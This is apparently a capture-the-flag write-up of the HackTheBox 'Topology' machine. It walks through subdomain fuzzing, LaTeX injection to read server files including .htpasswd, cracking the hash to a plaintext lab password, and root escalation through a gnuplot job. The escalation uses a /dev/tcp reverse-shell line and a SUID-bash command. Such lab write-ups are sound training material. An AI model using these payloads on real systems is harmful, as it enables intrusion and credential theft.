
## Reconnaissance

### nmap 

> Scan Target Machine

![](./IMG/0.png)

![](./IMG/1.png)

### Web Service 

- Home Page 
![](./IMG/2.png)

- Clicke 'Latex  Equation Generator' 
- If the /etc/hosts has set up the domain, it will redirect to latex.topology.htb/equation.php
![](./IMG/3.png)
- If I tried to access latex.topology.htb directly, it will response a directory page 
![](./IMG/16.png)
### Gobuster 

- Gobuster scan the domain 
```
gobuster dir -u http://10.10.11.217 -w /usr/share/wordlists/dirb/common.tx -o toplogy1.out
```
![](./IMG/4.png)
![](./IMG/5.png)

### ffuf 


- Besides gobuster result, since there is a subdomain latex.topology.htb.
- I think it might have another subdomain.
- So I used FFuF to scan it 
```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-topmillion-5000.txt:FUZZ -u http://topology.htb -H "Host:FUZZ.topology.htb" 
```
- Without filter, it will show a lot of unsuccess domain, so I filter by 'Words'.
![](./IMG/23.png)
![](./IMG/24.png)
- Add filter condition
```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-topmillion-5000.txt:FUZZ -u http://topology.htb -H "Host:FUZZ.topology.htb" -fw 1612
```
![](./IMG/21.png)

![](./IMG/22.png)
- Access the result subdomain

![](./IMG/20.png)

- dev one need credential.
![](./IMG/19.png)
- I didn't have credentials
![](./IMG/26.png)

## Exploit 

- Start intercept the request with Burp 
- Intercept the Generate latex code

![](./IMG/6.png)

- According to this [article](https://book.hacktricks.xyz/pentesting-web/formula-csv-doc-latex-ghostscript-injection)
  ![](./IMG/17.png)
  - I also tried the payload, but it didn't reply "Illega command detected"
```
\input{/etc/passwd}
```
![](./IMG/9.png)
- So, follow the instruction, I add '$' and '\[]'
```
\$input{/etc/passwd}$
\[input{/etc/passwd}]
```
- It didn't replied anything, even the error message.
![](./IMG/7.png)
![](./IMG/8.png)
- But I felt strange that the response is empty, so I resend it several times.
- It response "Illegal command detected" again. (It's weird)
![](./IMG/10.png)
![](./IMG/11.png)
- Because the error message, no matter the special character('$ , \[') exist or not, it will show, so I think maybe the error not caused by the special character.
- So I change my payload
```
\lstinputlisting{/etc/passwd}
\$lstinputlisting{/etc/passwd}$
\[lstinputlisting{/etc/passwd}]
```
![](./IMG/13.png)
![](./IMG/12.png)
- Then the payload with '$' success to get my expect response.
![](./IMG/14.png)
- Now I can read the file in server, but the page seems can't show the whole file content.
- But I still find my target, that's enough.
```
vdaisley
```

![](./IMG/15.png)
- So I keep change the payload to read the file
```
\$lstinputlisting{/etc/os-release}$
```

![](./IMG/18.png)

- According to the ffuf result, I know there is a subdomain named 'dev'.
- So there might have a directory also named 'dev' in /var/www
- And according to the error message, I know the dev site runs on Apache
![](./IMG/26.png)
- Try to access the .htaccess which is an important config file in Apache service.
```
\$lstinputlisting{/var/www/dev/.htaccess}$
```
- I got a clue.
```
AuthUserFile /car/www/dev/.htpasswd
```
![](./IMG/25.png)
- So I also access to this file, too.
```
\$lstinputlisting{/var/www/dev/.htpasswd}$
```
- I found the credential for vdaisley
![](./IMG/27.png)

- Copy it as a file and crack it by john
![](./IMG/29.png)
```
john vdaisley.hash --wordlist="/usr/share/wordlists/rockyou.txt"
```
![](./IMG/28.png)
- Got the vdaisley's credential 
```
vdaisley / calculus20
```
## Privilege Escalation 


- So far, I get vdaisley's credential 
- I can use it to login to SSH
```
ssh vdaisley@10.10.11.217
```

![](./IMG/30.png)
- Confirm the current user 
```
id
whoami
```

![](./IMG/31.png)
- Checking the user flag first 
![](./IMG/32.png)
- And, actually the ssh shell is kind of strange, It start with '-bash-5.0$'
- I think that is caused by other challenger has escalate the privilege.
- But it's not matter, I still can enumerate and find the real vulnerability to escalate the privilege.
- Check sudo permission list, Failed 
```
sudo -l
```
![](./IMG/33.png)
- Check SUID to find the execute permission which set to 's'
```
find / -perm -u=s 2>/dev/null
```
![](./IMG/34.png)
- Upload pspy64s and check the current process
- It's easy to find an unusual and repeat process 
```
gnuplot /opt/gnuplot/loadplot.plt
bin/sh -c find "/opt/gnuplot" -name "*.plt" -exec gnuplot {} \;
```

![](./IMG/38.png)
- With this clue, I research about how to escalate the privilege by gnuplot.
- I found this [article](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/gnuplot-privilege-escalation/)
![](./IMG/40.png)
- Follow the payload guide, I do the following things 
```
echo "system 'bash -i >& /dev/tcp/10.10.16.23/4444 ->&1'" >> /opt/gnuplot/hacked.plt
```
- But it didn't reverse shell to my nc
- So, I tried to change the method to change the /bin/bash permission.
```
echo "system 'chmod u+s /bin/bash'" >> /opt/gnuplot/hached2.plt
```

![](./IMG/37.png)
- Then, use the following command to escalate the bash permission
```
bash -p
```
- And success to get root permission
![](./IMG/36.png)
- Get root flag
![](./IMG/35.png)

## Reference 
### Writeup

- [Topology — HTB](https://medium.com/@Char0n_0x04/topology-htb-1e4cf07d7805)
### Latex Injection 
- [(HackTricks)Formula/CSV/Doc/LaTeX/GhostScript Injection](https://book.hacktricks.xyz/pentesting-web/formula-csv-doc-latex-ghostscript-injection)

![](./IMG/17.png)

### John the Ripper

- [John The Ripper Hash Formats - md5 – FreeBSD MD5](https://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats)

![](./IMG/39.png)

### Gnuplot privilege Escalation

- [Gnuplot Privilege Escalation](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/gnuplot-privilege-escalation/)

![](./IMG/40.png)

###### tags: `HackTheBox` `latex injection` `gnuplot escalation`  `Apache webservice`